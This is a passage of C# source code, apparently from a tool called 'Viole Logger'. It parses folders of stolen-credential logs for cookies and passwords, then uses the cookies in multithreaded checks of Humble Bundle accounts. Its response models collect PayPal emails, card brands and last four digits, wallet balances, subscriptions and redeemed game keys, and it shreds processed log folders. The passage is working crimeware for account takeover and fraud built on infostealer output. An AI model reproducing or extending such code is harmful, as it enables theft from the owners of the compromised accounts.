                Button.SetValue(ControlsHelper.FocusBorderThicknessProperty, new Thickness(0));

                Button.Content = new System.Windows.Shapes.Path
                {
                    Stretch = Stretch.Fill,
                    Fill = Brushes.MediumPurple,
                    Data = Geometry.Parse(X.Geometry),
                };

                Grid.SetColumn(Button, 0);
                Grid.Children.Add(Button);

                var Label = new Label
                {
                    HorizontalAlignment = HorizontalAlignment.Right,
                    VerticalAlignment = VerticalAlignment.Center,
                    Margin = new Thickness(0, 5, 0, 0),
                    FontSize = 12
                };

                Label.SetBinding(ContentProperty, new Binding(X.Binding));

                Grid.SetColumn(Label, 1);
                Grid.Children.Add(Label);

                Summary.Children.Add(Grid);
            }

            #endregion
        }

        private async void Start_Click(object sender, RoutedEventArgs e) => await Start();

        private async Task Start()
        {
            if ((byte)Auto.Type.Value < 3 && string.IsNullOrEmpty(Auto.Directory))
            {
                var CommonOpenFileDialog = new CommonOpenFileDialog
                {
                    IsFolderPicker = true,
                    InitialDirectory = Auto.Type.Value == IAuto.EType.History
                        ? Path.Combine(Auto.Config.Log, "Humble Bundle (History)", "SAVE")
                        : Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                };

                if (CommonOpenFileDialog.ShowDialog() == CommonFileDialogResult.Ok)
                {
                    Auto.Directory = null;

                    try
                    {
                        string DirectoryName = $"{CommonOpenFileDialog.FileName}\\";

                        if (string.IsNullOrEmpty(DirectoryName)) return;

                        if (Directory.Exists(DirectoryName))
                        {
                            Auto.Directory = DirectoryName;
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }
                }
            }
            else
            {
                if (Auto.Type.Value == IAuto.EType.Sort)
                {
                    if (Auto.Directory.Contains(Path.Combine(Auto.Config.Log, "Humble Bundle (History)", "SAVE")))
                    {
                        Logger.LogGenericWarning("Выберите другую директорию!");

                        Auto.Directory = null;

                        return;
                    }

                    await ISort();
                }
                else
                {
                    var SteamIDs = Auto.Config.AccountList
                        .Select((x, i) => (Key: x, Index: i))
                        .ToDictionary(x => x.Key, x => x.Index);

                    if (SteamIDs.Count > 0)
                    {
                        var Select = new Selection(SteamIDs, false);

                        if (Select.ShowDialog() ?? false)
                        {
                            try
                            {
                                if (Auto.Config.MasterList.Count > 0)
                                    Auto.Config.MasterList.Clear();

                                var _ = Select.Auto.List
                                    .Select(x => x)
                                    .Where(x => x.Checked)
                                    .ToList();

                                Auto.ProgressBar = new Example.ProgressBar
                                {
                                    Maximum = _.Count,
                                    Value = 0
                                };

                                foreach (var T in _
                                    .Select((x, i) => (T: x, Index: i + 1))
                                    .ToList())
                                {
                                    try
                                    {
                                        var App = await GetApp(T.T.Pair.Value, T.T.Index);

                                        if (App == null) continue;

                                        if (App.Count > 0)
                                        {
                                            Logger.LogGenericDebug($"{T.T.Pair.Key} [{T.T.Index}] - App: {App.Count}");

                                            Auto.Config.MasterList.Add(T.T.Index, App
                                                .Select(x => x.Key)
                                                .ToList());
                                        }
                                    }
                                    finally
                                    {
                                        Auto.ProgressBar.Value = T.Index;

                                        await Task.Delay(500);
                                    }
                                }
                            }
                            catch (Exception e)
                            {
                                Logger.LogGenericException(e);
                            }
                            finally
                            {
                                Auto.ProgressBar.Dispose();
                                Auto.ProgressBar = null;
                            }
                        }
                    }

                    Auto.Summary.K = 0;
                    Auto.Summary.G = 0;
                    Auto.Summary.B = 0;
                    Auto.Summary.C = 0;

                    Auto.LogList.Clear();
                    Auto.DirectoryList.Clear();

                    if ((byte)Auto.Type.Value < 3)
                    {
                        var DirectoryList = Directory
                            .GetDirectories(Auto.Directory, "*", SearchOption.TopDirectoryOnly)
                            .Select(x =>
                            {
                                string[] _ = Directory.GetDirectories(x, "*", SearchOption.TopDirectoryOnly);

                                if (_.Length == 0)
                                    _ = new string[] { x };

                                return _;
                            })
                            .SelectMany(x => x)
                            .ToArray();

                        if (DirectoryList.Length == 0)
                            Auto.DirectoryList.Add(Auto.Directory);
                        else
                            Auto.DirectoryList.AddRange(DirectoryList);
                    }

                    await IChecker();

                    Auto.Directory = null;
                    Auto.Summary.Show = true;
                }
            }
        }

        #region Sort

        private async Task ISort()
        {
            try
            {
                var Temporary = (
                    Directory: Combine(Auto.Directory, "$ Directory"),
                    Archive: Combine(Auto.Directory, "$ Archive")
                );

                string[] DirectoryList = Directory
                    .GetDirectories(Auto.Directory, "*", SearchOption.TopDirectoryOnly)
                    .Where(x =>
                        x != Temporary.Directory &&
                        x != Temporary.Archive
                     )
                    .ToArray();

                Auto.ProgressBar = new Example.ProgressBar
                {
                    Maximum = DirectoryList.Length,
                    Value = 0
                };

                foreach (var (DirectoryValue, Index) in DirectoryList
                    .Where(x => !Guid.TryParse(x, out _))
                    .Select((x, i) => (Value: x, Index: i))
                    .ToList())
                {
                    string Destination = null;

                    while (Destination == null || Directory.Exists(Destination))
                    {
                        Destination = Path.Combine(Path.GetDirectoryName(DirectoryValue), $"{Guid.NewGuid()}");
                    }

                    Directory.Move(DirectoryValue, Destination);

                    DirectoryList[Index] = Destination;
                }

                foreach (var (DirectoryValue, Index) in DirectoryList
                    .Select((x, i) => (Value: x, Index: i + 1))
                    .ToList())
                {
                    await Task.Run(() => Tranfer(Temporary, DirectoryValue));

                    Auto.ProgressBar.Value = Index;
                }

                Empty(Temporary.Directory);
                Empty(Temporary.Archive);
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
            finally
            {
                Auto.ProgressBar.Dispose();
                Auto.ProgressBar = null;
            }
        }

        private bool Move(string T_Directory, string DirectoryValue)
        {
            try
            {
                string FileName = Combine(T_Directory, Path.GetFileName(DirectoryValue));

                string[] DirectoryList = Directory.GetDirectories(DirectoryValue, "*", SearchOption.TopDirectoryOnly);
                string[] FileList = Directory.GetFiles(DirectoryValue, "*", SearchOption.TopDirectoryOnly);

                if (DirectoryList.Length > 0 || FileList.Length > 0)
                {
                    foreach (string _ in DirectoryList.Concat(FileList))
                    {
                        string Temporary = Path.Combine(FileName, Path.GetFileName(_));

                        if (Directory.Exists(_))
                        {
                            while (Directory.Exists(Temporary))
                            {
                                Temporary = Path.Combine(FileName, $"{Guid.NewGuid()}");
                            }

                            Directory.Move(_, Temporary);
                        }
                        else if (File.Exists(_))
                        {
                            while (File.Exists(Temporary))
                            {
                                Temporary = Path.Combine(FileName, $"{Guid.NewGuid()}{Path.GetExtension(_)}");
                            }

                            File.Move(_, Temporary);
                        }
                    }

                    Helper.Shredder(new DirectoryInfo(DirectoryValue));

                    return true;
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return false;
        }

        private void Archive(string T_Archive, string[] List)
        {
            try
            {
                foreach (string _ in List)
                {
                    string Temporary = Path.Combine(T_Archive, Path.GetFileName(_));

                    while (File.Exists(Temporary))
                    {
                        Temporary = Path.Combine(T_Archive, $"{Guid.NewGuid()}{Path.GetExtension(_)}");
                    }

                    File.Move(_, Temporary);
                    File.Delete(_);
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        private void Empty(string DirectoryValue)
        {
            try
            {
                string[] D = Directory.GetDirectories(DirectoryValue, "*", SearchOption.TopDirectoryOnly);
                string[] F = Directory.GetFiles(DirectoryValue, "*", SearchOption.TopDirectoryOnly);

                if (D.Length == 0 && F.Length == 0)
                {
                    Helper.Shredder(new DirectoryInfo(DirectoryValue));
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        private void Tranfer((string Directory, string Archive) Temporary, string DirectoryValue, string _ = null)
        {
            try
            {
                var GroupBy = Directory
                    .GetFiles(DirectoryValue, "*", SearchOption.TopDirectoryOnly)
                    .GroupBy(x => WIN_RAR.Any(v => x.ToUpper().EndsWith(v)))
                    .Select(x => (
                        Archive: x.Key,
                        List: x.Select(o => o).ToList()
                    ))
                    .ToList();

                if (GroupBy.Any(x => x.Archive))
                {
                    Archive(Temporary.Archive, GroupBy
                        .Where(x => x.Archive)
                        .SelectMany(x => x.List)
                        .ToArray());
                }

                string[] DirectoryList = Directory.GetDirectories(DirectoryValue, "*", SearchOption.TopDirectoryOnly);

                if (DirectoryList.Length == 1)
                {
                    Tranfer(Temporary, DirectoryList.FirstOrDefault(), DirectoryValue);
                }
                else
                {
                    if (string.IsNullOrEmpty(_))
                    {
                        var ArchiveList = Directory
                            .GetDirectories(DirectoryValue, "*", SearchOption.TopDirectoryOnly)
                            .Select(x =>
                            {
                                string[] FileList = Directory.GetFiles(x, "*", SearchOption.TopDirectoryOnly)
                                    .Where(v => WIN_RAR.Any(o => v.ToUpper().EndsWith(o)))
                                    .ToArray();

                                return (DirectoryValue: x, List: FileList);
                            })
                            .Where(x => x.List.Length > 0)
                            .ToList();

                        for (int i = 0; i < ArchiveList.Count; i++)
                        {
                            Archive(Temporary.Archive, ArchiveList[i].List);

                            Empty(ArchiveList[i].DirectoryValue);
                        }
                    }
                    else
                    {
                        if (DirectoryList.Length > 0 || GroupBy.Any(x => !x.Archive))
                        {
                            if (Move(Temporary.Directory, DirectoryValue))
                            {
                                Helper.Shredder(new DirectoryInfo(_));
                            }
                        }
                    }
                }

                if (Directory.Exists(DirectoryValue))
                {
                    Empty(DirectoryValue);
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        #endregion

        private async Task IChecker()
        {
            try
            {
                if (Auto.Type.Value == IAuto.EType.Bin)
                {
                    var ARRAY = File.ReadAllLines(BinFile);

                    foreach (string x in ARRAY)
                    {
                        string X = x.Replace("\r", "");

                        var Cookie = GetCookie(X);

                        if (Cookie == null) continue;

                        Auto.LogList.Add(new ILog
                        {
                            DirectoryValue = ConfigDirectory,
                            Cookie = new List<ILog.ICookieList>
                            {
                                new ILog.ICookieList(BinFile, new List<ILog.ICookie> { Cookie })
                            }
                        });
                    }
                }
                else
                {
                    Logger.LogGenericDebug($"Directory: {Auto.DirectoryList.Count}");

                    await IDirectory();
                }

                Logger.LogGenericDebug($"Log: {Auto.LogList.Count}");

                if (Auto.LogList.Count > 0)
                {
                    await ILog();
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
            finally
            {
                string DirectoryValue = Auto.Type.Value == IAuto.EType.History
                    ? Path.Combine("Humble Bundle (History)", "NEW")
                    : "Humble Bundle";

                string Combine = Path.Combine(Auto.Config.Log, DirectoryValue);

                if (Directory.Exists(Combine))
                {
                    string[] D = Directory.GetDirectories(Combine, "*", SearchOption.TopDirectoryOnly);

                    foreach (var X in D)
                    {
                        try
                        {
                            if (X == "_") continue;

                            string[] F = Directory.GetFiles(X, "*.txt", SearchOption.TopDirectoryOnly);

                            foreach (var V in F)
                            {
                                try
                                {
                                    string R = File.ReadAllText(V);

                                    if (string.IsNullOrEmpty(R)) continue;

                                    int Count = Regex.Matches(R, @"E-MAIL: (.+)").Count;

                                    if (Count <= 1) continue;

                                    string DirectoryName = Path.GetDirectoryName(V);
                                    string FileName = Path.GetFileName(V);

                                    File.Move(V, Path.Combine(DirectoryName, $"({Count}) {FileName}"));
                                }
                                catch (Exception e)
                                {
                                    Logger.LogGenericException(e);
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }
                }
            }
        }

        #region Directory

        private async Task IDirectory()
        {
            try
            {
                Checked = 0;

                int ThreadCount = Auto.Config.ThreadCount;

                if (Auto.DirectoryList.Count < ThreadCount)
                    ThreadCount = Auto.DirectoryList.Count;

                if (Thread?.Length > 0)
                    Thread.ToList().ForEach(x => x?.Abort());

                Thread = new Thread[ThreadCount];

                Auto.ProgressBar = new Example.ProgressBar
                {
                    Maximum = Auto.DirectoryList.Count,
                    Value = 0
                };

                for (int i = 0; i < ThreadCount; i++)
                {
                    Thread[i] = new Thread(() => IDirectoryQueue())
                    {
                        IsBackground = true,
                        Name = string.Format("{0:D3}", i)
                    };

                    Thread[i].Start();
                }

                while (true)
                {
                    if (Auto.ProgressBar.Value >= Auto.DirectoryList.Count) break;

                    await Task.Delay(1000);
                }
            }

            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
            finally
            {
                Auto.ProgressBar.Dispose();
                Auto.ProgressBar = null;
            }
        }

        private void IDirectoryQueue()
        {
            var Logger = new Logger("Viole Logger.exe", System.Threading.Thread.CurrentThread.Name);

            try
            {
                while (Checked < Auto.DirectoryList.Count)
                {
                    try
                    {
                        if (Checked > Auto.DirectoryList.Count) break;

                        string Directory;

                        lock (Lock)
                        {
                            Directory = Auto.DirectoryList[Checked++];
                        }

                        if (Directory != null)
                        {
                            IDirectoryPrimary(Directory, Logger);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        private void IDirectoryPrimary(string _, Logger Logger)
        {
            try
            {
                var Log = new ILog
                {
                    DirectoryValue = Directory.GetParent(_).FullName
                };

                string[] FileList = Directory.GetFiles(_, "*.txt", SearchOption.AllDirectories);

                foreach (string FileValue in FileList)
                {
                    try
                    {
                        if (File.Exists(FileValue))
                        {
                            var Cookie = GetCookieLine(FileValue);

                            if (Cookie != null && Cookie.Count > 0)
                            {
                                Log.Cookie.Add(new ILog.ICookieList(FileValue, Cookie));
                            }

                            var Password = GetPasswordLine(FileValue);

                            if (Password != null && Password.Count > 0)
                            {
                                Log.Password.AddRange(Password);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }
                }

                if (Log.Cookie.Count > 0)
                {
                    lock (Lock)
                    {
                        Auto.LogList.Add(Log);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
            finally
            {
                lock (Lock)
                {
                    if (Auto.ProgressBar != null)
                    {
                        ++Auto.ProgressBar.Value;
                    }
                }
            }
        }

        #endregion

        #region Log

        private async Task ILog()
        {
            try
            {
                Checked = 0;

                int ThreadCount = Auto.Config.ThreadCount;

                if (Auto.LogList.Count < ThreadCount)
                    ThreadCount = Auto.LogList.Count;

                if (Thread?.Length > 0)
                    Thread.ToList().ForEach(x => x?.Abort());

                Thread = new Thread[ThreadCount];

                Auto.ProgressBar = new Example.ProgressBar
                {
                    Maximum = Auto.LogList.Count,
                    Value = 0
                };

                for (int i = 0; i < ThreadCount; i++)
                {
                    Thread[i] = new Thread(() => ILogQueue())
                    {
                        IsBackground = true,
                        Name = string.Format("{0:D3}", i)
                    };

                    Thread[i].Start();
                }

                while (true)
                {
                    if (Auto.ProgressBar.Value >= Auto.LogList.Count) break;

                    await Task.Delay(1000);
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
            finally
            {
                Auto.ProgressBar.Dispose();
                Auto.ProgressBar = null;
            }
        }

        private async void ILogQueue()
        {
            var Logger = new Logger("Viole Logger.exe", System.Threading.Thread.CurrentThread.Name);

            try
            {
                while (Checked < Auto.LogList.Count)
                {
                    try
                    {
                        if (Checked > Auto.LogList.Count) break;

                        ILog Log;

                        lock (Lock)
                        {
                            Log = Auto.LogList[Checked++];
                        }

                        if (Log != null)
                        {
                            await ILogPrimary(Log, Logger);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        private async Task ILogPrimary(ILog _, Logger Logger)
        {
            try
            {
                await IHumbleBundle(_, Logger);
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
            finally
            {
                lock (Lock)
                {
                    if (Auto.ProgressBar != null)
                    {
                        ++Auto.ProgressBar.Value;
                    }
                }
            }
        }

        #endregion

        #region Humble Bundle 

        public class IHumbleBundleResponse
        {
            #region Date

            public class IDate
            {
                [JsonProperty("updated")]
                public DateTime Updated { get; set; } = DateTime.MinValue;

                public bool ShouldSerializeUpdated() => Updated != DateTime.MinValue;

                [JsonProperty("checked")]
                public DateTime Checked
                {
                    get => DateTime.UtcNow;
                }
            }

            [JsonProperty("date")]
            public IDate Date { get; set; } = new IDate();

            #endregion

            #region User

            public class IUser
            {
                public class IMoney
                {
                    [JsonProperty("currency")]
                    public string Currency { get; set; } = "UNKNOWN";

                    [JsonProperty("amount")]
                    public double Amount { get; set; } = 0d;

                    public bool Difference(Logger Logger, IMoney OLD)
                    {
                        if (Currency != OLD.Currency)
                        {
                            Logger.LogGenericWarning($"CHANGED: \"{nameof(Currency)}\" | OLD: {OLD.Currency} | NEW: {Currency}");
                        }

                        if (Amount != OLD.Amount)
                        {
                            Logger.LogGenericWarning($"CHANGED: \"{nameof(Amount)}\" | OLD: {OLD.Amount} | NEW: {Amount}");
                        }

                        return Currency != OLD.Currency ||
                               Amount != OLD.Amount;
                    }

                    public override string ToString()
                    {
                        return $"{Amount} {Currency}";
                    }
                }

                public class IDefault
                {
                    #region Created Date

                    [JsonProperty("created_date")]
                    public DateTime Created { get; set; }

                    [JsonProperty("created|datetime")]
                    public DateTime CreatedDefault
                    {
                        set => Created = value;
                    }

                    public bool ShouldSerializeCreatedDefault() => false;

                    #endregion

                    #region Has Admin Access

                    [JsonProperty("has_admin_access")]
                    public bool HasAdminAccess { get; set; }

                    public bool ShouldSerializeHasAdminAccess() => HasAdminAccess;

                    #endregion

                    #region Payment

                    public class IPayment
                    {
                        #region Type

                        [JsonProperty("type")]
                        public string Type { get; set; }

                        [JsonProperty("credentials_type")]
                        public string TypeDefault
                        {
                            set => Type = value;
                        }

                        public bool ShouldSerializeTypeDefault() => false;

                        #endregion

                        #region EMail

                        [JsonProperty("email")]
                        public string EMail { get; set; }

                        public bool ShouldSerializeEMail() => Type.ToUpper() == "PAYPAL";

                        [JsonProperty("paypal_email")]
                        public string EMailDefault
                        {
                            set => EMail = value;
                        }

                        public bool ShouldSerializeEMailDefault() => false;

                        #endregion

                        #region Card

                        [JsonProperty("last4")]
                        public long Last4 { get; set; }

                        public bool ShouldSerializeLast4() => Type.ToUpper() == "STRIPE";

                        #region Brand

                        [JsonProperty("brand")]
                        public string Brand { get; set; }

                        public bool ShouldSerializeBrand() => Type.ToUpper() == "STRIPE";

                        [JsonProperty("card_brand")]
                        public string BrandDefault
                        {
                            set => Brand = value;
                        }

                        public bool ShouldSerializeBrandDefault() => false;

                        #endregion

                        #endregion

                        public override string ToString()
                        {
                            string X = Type.ToUpper();

                            return string.Concat(
                                $"{X} - ",
                                X == "PAYPAL"
                                    ? $"{EMail}"
                                    : X == "STRIPE"
                                        ? $"{Brand.ToUpper()} {Last4}"
                                        : "UNKNOWN");
                        }
                    }

                    #region Payment

                    [JsonProperty("payment")]
                    public List<IPayment> Payment { get; set; }

                    public bool ShouldSerializePayment() => Payment != null && Payment.Count > 0;

                    [JsonProperty("payment_credentials")]
                    public List<IPayment> PaymentDefault
                    {
                        set => Payment = value;
                    }

                    public bool ShouldSerializePaymentDefault() => false;

                    #endregion

                    #endregion

                    [JsonProperty("email")]
                    public string EMail { get; set; }
                }

                #region Default

                [JsonProperty("default")]
                public IDefault Default { get; set; }

                [JsonProperty("userOptions")]
                public IDefault Option
                {
                    set => Default = value;
                }

                public bool ShouldSerializeOption() => false;

                #endregion

                #region Wallet Balance

                [JsonProperty("walletBalance|decimal")]
                public double WalletBalance { get; set; }

                public bool ShouldSerializeWalletBalance() => false;

                #endregion

                #region Wallet Currency

                [JsonProperty("walletCurrency")]
                public string WalletCurrency { get; set; }

                public bool ShouldSerializeWalletCurrency() => false;

                #endregion

                #region Wallet

                [JsonProperty("wallet")]
                public IMoney Wallet { get; set; }

                public bool ShouldSerializeWallet() => Wallet != null && Wallet.Amount > 0d;

                #endregion

                public class ISubscription
                {
                    #region Join Date

                    [JsonProperty("join_date")]
                    public DateTime? JoinDate { get; set; }

                    public bool ShouldSerializeJoinDate() => JoinDate != null && JoinDate != DateTime.MinValue;

                    #endregion

                    #region Name

                    [JsonProperty("name")]
                    public string Name { get; set; }

                    public bool ShouldSerializeName() => !string.IsNullOrEmpty(Name);

                    [JsonProperty("human_name")]
                    public string NameDefault
                    {
                        set
                        {
                            if (string.IsNullOrEmpty(value)) return;

                            Name = value;
                        }
                    }

                    public bool ShouldSerializeNameDefault() => false;

                    #endregion

                    #region Status

                    [JsonProperty("status")]
                    public string Status { get; set; }

                    public bool ShouldSerializeStatus() => !string.IsNullOrEmpty(Status);

                    [JsonIgnore]
                    public byte Code
                    {
                        get
                        {
                            if (string.IsNullOrEmpty(Status))
                            {
                                return 0;
                            }

                            if (Status == "ACTIVE")
                            {
                                return 3;
                            }
                            else if (Status.StartsWith("INACTIVE"))
                            {
                                int N = DateTime.Now.Subtract(MonthlyContent.EndDate ?? DateTime.MinValue).Days;

                                if (N > 0 && N < 365)
                                {
                                    return 2;
                                }

                                return 0;
                            }

                            Logger.LogGenericDebug($"VALUE: {Status}");

                            return 1;
                        }
                    }

                    #endregion

                    #region Expiry Date

                    [JsonProperty("expiry_date")]
                    public DateTime? ExpiryDate { get; set; }

                    public bool ShouldSerializeExpiryDate() => ExpiryDate != null && ExpiryDate != DateTime.MinValue;

                    #endregion

                    #region Billing Date

                    [JsonProperty("next_billing_date")]
                    public DateTime? NextBillingDate { get; set; }

                    public bool ShouldSerializeNextBillingDate() => NextBillingDate != null && NextBillingDate != DateTime.MinValue;

                    #endregion

                    #region Pause

                    public class IPause
                    {
                        [JsonIgnore]
                        public bool Enabled { get; set; }

                        #region Last Skipped

                        [JsonProperty("Last_skipped")]
                        public string LastSkipped { get; set; }

                        public bool ShouldSerializeLastSkipped() => Enabled && !string.IsNullOrEmpty(LastSkipped);

                        #endregion

                        #region Resume Date

                        [JsonProperty("resume_date")]
                        public DateTime? ResumeDate { get; set; }
                        public bool ShouldSerializeResumeDate() => Enabled && (ResumeDate != null && ResumeDate != DateTime.MinValue);

                        #endregion

                        public bool Difference(Logger Logger, IPause OLD)
                        {
                            if (LastSkipped != OLD.LastSkipped)
                            {
                                Logger.LogGenericWarning($"CHANGED: \"{nameof(LastSkipped)}\" | OLD: {OLD.LastSkipped} | NEW: {LastSkipped}");
                            }

                            if (ResumeDate != OLD.ResumeDate)
                            {
                                Logger.LogGenericWarning($"CHANGED: \"{nameof(ResumeDate)}\" | OLD: {OLD.ResumeDate} | NEW: {ResumeDate}");
                            }

                            return LastSkipped != OLD.LastSkipped ||
                                   ResumeDate != OLD.ResumeDate;
                        }
                    }

                    [JsonProperty("pause")]
                    public IPause Pause { get; set; } = new IPause();

                    public bool ShouldSerializePause() => Pause.Enabled || Pause.ShouldSerializeLastSkipped() || Pause.ShouldSerializeResumeDate();

                    #endregion

                    #region Monthly

                    public class IMonthlyContent
                    {
                        #region Active

                        [JsonProperty("active")]
                        public bool Active { get; set; }

                        public bool ShouldSerializeActive() => Active;

                        #endregion

                        #region Name

                        [JsonProperty("name")]
                        public string Name { get; set; }

                        public bool ShouldSerializeName() => !string.IsNullOrEmpty(Name);

                        #endregion

                        #region End Date

                        [JsonProperty("end_date")]
                        public DateTime? EndDate { get; set; }

                        public bool ShouldSerializeEndDate() => EndDate != null && EndDate != DateTime.MinValue;

                        #endregion

                        public bool Difference(Logger Logger, IMonthlyContent OLD)
                        {
                            if (Active != OLD.Active)
                            {
                                Logger.LogGenericWarning($"CHANGED: \"{nameof(Active)}\" | OLD: {OLD.Active} | NEW: {Active}");
                            }

                            if (Name != OLD.Name)
                            {
                                Logger.LogGenericWarning($"CHANGED: \"{nameof(Name)}\" | OLD: {OLD.Name} | NEW: {Name}");
                            }

                            if (EndDate != OLD.EndDate)
                            {
                                Logger.LogGenericWarning($"CHANGED: \"{nameof(EndDate)}\" | OLD: {OLD.EndDate} | NEW: {EndDate}");
                            }

                            return Active != OLD.Active ||
                                   Name != OLD.Name ||
                                   EndDate != OLD.EndDate;
                        }
                    }

                    [JsonProperty("monthly_content")]
                    public IMonthlyContent MonthlyContent { get; set; } = new IMonthlyContent();

                    public bool ShouldSerializeMonthlyContent() => MonthlyContent.ShouldSerializeActive() || MonthlyContent.ShouldSerializeName() || MonthlyContent.ShouldSerializeEndDate();

                    #endregion

                    #region Money

                    [JsonProperty("price")]
                    public IMoney Money { get; set; }

                    public bool ShouldSerializeMoney() => Money != null && Money.Amount > 0d;

                    [JsonProperty("pricing|money")]
                    public IMoney MoneyDefault
                    {
                        set => Money = value;
                    }

                    public bool ShouldSerializeMoneyDefault() => false;

                    #endregion

                    public bool Difference(Logger Logger, ISubscription OLD)
                    {
                        bool _Name = ShouldSerializeName() && OLD.ShouldSerializeName() && Name != OLD.Name;

                        if (_Name)
                        {
                            Logger.LogGenericWarning($"CHANGED: \"{nameof(Name)}\" | OLD: {OLD.Name} | NEW: {Name}");
                        }

                        bool _Status = ShouldSerializeStatus() && OLD.ShouldSerializeStatus() && Status != OLD.Status;

                        if (_Status)
                        {
                            Logger.LogGenericWarning($"CHANGED: \"{nameof(Status)}\" | OLD: {OLD.Status} | NEW: {Status}");
                        }

                        bool _ExpiryDate = ShouldSerializeExpiryDate() && OLD.ShouldSerializeExpiryDate() && ExpiryDate != OLD.ExpiryDate;

                        if (_ExpiryDate)
                        {
                            Logger.LogGenericWarning($"CHANGED: \"{nameof(ExpiryDate)}\" | OLD: {OLD.ExpiryDate} | NEW: {ExpiryDate}");
                        }

                        return _Name ||
                                _Status ||
                                _ExpiryDate ||
                               (ShouldSerializePause() && OLD.ShouldSerializePause() && Pause.Difference(Logger, OLD.Pause)) ||
                               (ShouldSerializeMonthlyContent() && OLD.ShouldSerializeMonthlyContent() && MonthlyContent.Difference(Logger, OLD.MonthlyContent)) ||
                               (ShouldSerializeMoney() && OLD.ShouldSerializeMoney() && Money.Difference(Logger, OLD.Money));
                    }
                }

                #region Subscription

                [JsonProperty("subscription")]
                public ISubscription Subscription { get; set; } = new ISubscription();

                public bool ShouldSerializeSubscription() => Subscription.Code > 0;

                [JsonProperty("userSubscriptionPlan")]
                public ISubscription SubscriptionDefault
                {
                    set
                    {
                        if (value == null) return;

                        Subscription = value;
                    }
                }

                public bool ShouldSerializeSubscriptionDefault() => false;

                #endregion

                #region Join Date

                [JsonProperty("subscriptionJoinDate|datetime")]
                public DateTime JoinDate { get; set; }

                public bool ShouldSerializeJoinDate() => false;

                #endregion

                #region Expiry Date

                [JsonProperty("subscriptionExpires|datetime")]
                public DateTime ExpiryDate { get; set; }

                public bool ShouldSerializeExpiryDate() => false;

                #endregion

                public bool Difference(Logger Logger, IUser OLD)
                {
                    return (
                            (OLD.Wallet == null && (Wallet != null && ShouldSerializeWallet())) ||
                            (ShouldSerializeWallet() && OLD.ShouldSerializeWallet() && Wallet.Difference(Logger, OLD.Wallet))
                           )
                           ||
                           (
                            (OLD.Subscription == null && (Subscription != null && ShouldSerializeSubscription())) ||
                            (ShouldSerializeSubscription() && OLD.ShouldSerializeSubscription() && Subscription.Difference(Logger, OLD.Subscription))
                           );
                }
            }

            [JsonProperty("user")]
            public IUser User { get; set; }

            #endregion

            #region Game Key

            public class IGameKeyList
            {
                [JsonProperty("gamekey")]
                public string GameKey { get; set; }
            }

            [JsonIgnore]
            public List<string> GameKeyList { get; set; }

            public bool ShouldSerializeGameKeyList() => GameKeyList != null && GameKeyList.Count > 0;

            #endregion

            #region Order

            public class IOrder
            {
                [JsonIgnore]
                public string _ { get; set; }

                [JsonProperty("amount_spent")]
                public double Spent { get; set; } = 0d;

                #region Product

                public class IProduct
                {
                    [JsonProperty("choice_url")]
                    public string URL { get; set; }

                    [JsonProperty("human_name")]
                    public string Name { get; set; }

                    [JsonProperty("is_subs_v2_product")]
                    public bool V2 { get; set; } // choices_remaining > 0 && total_choices > 0

                    [JsonProperty("is_subs_v3_product")]
                    public bool V3 { get; set; } // choices_remaining == 0 && total_choices == 0
                }

                [JsonProperty("Product")]
                public IProduct Product { get; set; }

                #endregion

                [JsonProperty("gamekey")]
                public string GameKey { get; set; }

                [JsonProperty("created")]
                public DateTime Created { get; set; }

                #region Dict

                public class IDict
                {
                    public class IAll
                    {
                        [JsonProperty("gamekey")]
                        public string GameKey { get; set; }

                        [JsonProperty("expiry_date")]
                        public string ExpiryDate { get; set; }

                        [JsonProperty("disallowed_countries")]
                        public List<string> Country { get; set; }

                        [JsonProperty("sold_out")]
                        public bool Sold { get; set; }

                        #region Instruction

                        [JsonProperty("instructions_html")]
                        public string InstructionHTML
                        {
                            set
                            {
                                if (string.IsNullOrEmpty(value)) return;

                                GetInstruction(value);
                            }
                        }

                        [JsonProperty("custom_instructions_html")]
                        public string InstructionCustom
                        {
                            set
                            {
                                if (string.IsNullOrEmpty(value)) return;

                                GetInstruction(value);
                            }
                        }

                        [JsonIgnore]
                        public List<string> Instruction { get; set; } = new List<string>();

                        private void GetInstruction(string Value)
                        {
                            try
                            {
                                var Matches = Regex.Matches(
                                    Regex.Unescape(Value),
                                    @"(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:\/?#[\]@!\$&'\(\)\*\+,;=.]+")
                                    .Cast<Match>()
                                    .ToArray();

                                Instruction = Matches
                                    .Where(x => x.Success)
                                    .Select(x => Regex.Replace(x.Value, "['|\"]", ""))
                                    .Distinct()
                                    .ToList();
                            }
                            catch (Exception e)
                            {
                                Logger.LogGenericException(e);
                            }
                        }


                        #endregion

                        [JsonProperty("redeemed_key_val")]
                        public string Key { get; set; }

                        private string _Type;

                        [JsonProperty("key_type_human_name")]
                        public string Type
                        {
                            get => _Type;
                            set
                            {
                                _Type = value
                                    .Replace("\\", "").Replace("/", "").Replace("\"", "")
                                    .Replace("*", "").Replace(":", "").Replace("?", "")
                                    .Replace("<", "").Replace(">", "")
                                    .Replace("|", "");
                            }
                        }

                        [JsonIgnore]
                        public uint AppID { get; set; }

                        [JsonProperty("steam_app_id")]
                        public string SteamAppID
                        {
                            set
                            {
                                if (string.IsNullOrEmpty(value))
                                {
                                    switch (Name)
                                    {
